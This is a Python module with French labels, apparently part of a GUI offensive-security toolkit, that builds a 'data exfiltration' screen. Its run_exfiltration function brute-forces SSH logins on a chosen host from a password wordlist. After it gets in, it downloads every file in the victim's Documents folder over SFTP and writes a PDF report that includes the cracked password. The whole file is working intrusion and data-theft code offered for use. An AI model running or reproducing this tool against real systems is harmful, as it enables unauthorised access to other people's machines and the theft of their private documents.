import os
import paramiko
import customtkinter as ctk
import tkinter as tk
from tkinter import scrolledtext, filedialog, messagebox
from fpdf import FPDF

def create_exfiltration_frame(app):
    global exfiltration_host_entry, exfiltration_user_entry, exfiltration_pass_entry, exfiltration_result_text
    exfiltration_frame = ctk.CTkFrame(app, width=1720, height=1080, fg_color="#D3D3D3")
    exfiltration_label = ctk.CTkLabel(exfiltration_frame, text="Exfiltration de données", font=("Helvetica", 20), text_color="black")
    exfiltration_label.pack(pady=20)

    exfiltration_host_label = ctk.CTkLabel(exfiltration_frame, text="Host :", font=("Helvetica", 14), text_color="black")
    exfiltration_host_label.pack(pady=(20, 5))

    exfiltration_host_entry = ctk.CTkEntry(exfiltration_frame, width=300)
    exfiltration_host_entry.pack(pady=5)

    exfiltration_user_label = ctk.CTkLabel(exfiltration_frame, text="Nom d'utilisateur :", font=("Helvetica", 14), text_color="black")
    exfiltration_user_label.pack(pady=(20, 5))

    exfiltration_user_entry = ctk.CTkEntry(exfiltration_frame, width=300)
    exfiltration_user_entry.pack(pady=5)

    exfiltration_pass_label = ctk.CTkLabel(exfiltration_frame, text="Fichier de mots de passe :", font=("Helvetica", 14), text_color="black")
    exfiltration_pass_label.pack(pady=(20, 5))

    exfiltration_pass_entry = ctk.CTkEntry(exfiltration_frame, width=300)
    exfiltration_pass_entry.pack(pady=5)

    def select_exfiltration_password_file():
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        exfiltration_pass_entry.delete(0, "end")
        exfiltration_pass_entry.insert(0, file_path)

    exfiltration_pass_button = ctk.CTkButton(exfiltration_frame, text="Sélectionner le fichier", command=select_exfiltration_password_file)
    exfiltration_pass_button.pack(pady=(5, 20))

    exfiltration_result_text = scrolledtext.ScrolledText(exfiltration_frame, width=80, height=20, wrap="word")
    exfiltration_result_text.pack(pady=(20, 10))
    exfiltration_result_text.configure(state="disabled")

    exfiltration_button_frame = ctk.CTkFrame(exfiltration_frame, fg_color="#D3D3D3")
    exfiltration_button_frame.pack(pady=10)
    exfiltration_launch_button = ctk.CTkButton(exfiltration_button_frame, text="Lancer", command=lambda: run_exfiltration(exfiltration_host_entry.get(), exfiltration_user_entry.get(), exfiltration_pass_entry.get()))
    exfiltration_launch_button.pack(side="left", padx=(0, 10))
    exfiltration_pdf_button = ctk.CTkButton(exfiltration_button_frame, text="Télécharger en PDF", command=save_exfiltration_as_pdf)
    exfiltration_pdf_button.pack(side="left", padx=(10, 0))

    return exfiltration_frame

def run_exfiltration(host, username, password_file):
    if host and username and password_file:
        if not os.path.isfile(password_file):
            messagebox.showerror("Erreur", f"Le fichier {password_file} est introuvable.")
            return

        exfiltration_result_text.configure(state="normal")
        exfiltration_result_text.delete(1.0, "end")
        try:
            with open(password_file, 'r') as file:
                passwords = file.readlines()

            success = False
            attempts = 0
            last_password = ""

            for password in passwords:
                password = password.strip()
                attempts += 1
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, username=username, password=password)
                    exfiltration_result_text.insert("end", f"Succès avec le mot de passe : {password}\n")
                    last_password = password
                    success = True

                    sftp = ssh.open_sftp()
                    remote_dir = f"/home/{username}/Documents"
                    local_dir = f"exfiltrated_documents/{username}_Documents"
                    if not os.path.exists(local_dir):
                        os.makedirs(local_dir)

                    for item in sftp.listdir(remote_dir):
                        remote_item_path = os.path.join(remote_dir, item)
                        local_item_path = os.path.join(local_dir, item)
                        try:
                            exfiltration_result_text.insert("end", f"Téléchargement de {item}...\n")
                            sftp.get(remote_item_path, local_item_path)
                            if os.path.exists(local_item_path):
                                exfiltration_result_text.insert("end", f"{item} téléchargé avec succès.\n")
                        except Exception as e:
                            continue

                    sftp.close()
                    ssh.close()
                    break
                except paramiko.AuthenticationException:
                    continue
                except Exception as e:
                    continue

                exfiltration_result_text.see("end")
                exfiltration_result_text.update_idletasks()

            if success:
                exfiltration_result_text.insert("end", f"Connexion réussie après {attempts} tentatives avec le mot de passe : {last_password}\n")
            else:
                exfiltration_result_text.insert("end", f"Échec de la connexion après {attempts} tentatives.\n")

        except Exception as e:
            exfiltration_result_text.insert("end", f"Erreur : {e}\n")
        exfiltration_result_text.configure(state="disabled")

def save_exfiltration_as_pdf(file_path=None):
    if not file_path:
        file_path = filedialog.asksaveasfilename(defaultextension=".pdf", filetypes=[("PDF files", "*.pdf")])
    if file_path:
        pdf = FPDF()
        pdf.add_page()
        pdf.set_auto_page_break(auto=True, margin=15)
        pdf.set_font("Arial", 'B', size=16)
        pdf.cell(0, 10, "Rapport Exfiltration de données", ln=True, align='C')
        pdf.set_font("Arial", 'BU', size=14)
        pdf.cell(0, 10, "Résultats", ln=True)
        pdf.set_font("Arial", size=12)
        exfiltration_result_text.configure(state="normal")
        lines = exfiltration_result_text.get(1.0, "end").split("\n")
        exfiltration_result_text.configure(state="disabled")
        exfiltration_info = f"Host : {exfiltration_host_entry.get()}\nNom d'utilisateur : {exfiltration_user_entry.get()}\n\n"
        pdf.multi_cell(0, 10, exfiltration_info)
        attempts = 0
        last_password = ""
        for line in lines:
            line_encoded = line.encode('latin-1', 'replace').decode('latin-1')
            pdf.multi_cell(0, 10, line_encoded)
            if "Échec avec le mot de passe" in line or "Succès avec le mot de passe" in line:
                attempts += 1
            if "Succès avec le mot de passe" in line:
                last_password = line.split(": ")[-1]
        if last_password:
            pdf.set_font("Arial", 'BU', size=14)
            pdf.cell(0, 10, "\nRésumé", ln=True)
            pdf.set_font("Arial", size=12)
            pdf.multi_cell(0, 10, f"Connexion réussie après {attempts} tentatives avec le mot de passe : {last_password}")
        else:
            pdf.multi_cell(0, 10, f"Échec de la connexion après {attempts} tentatives.\n")
        pdf.output(file_path)
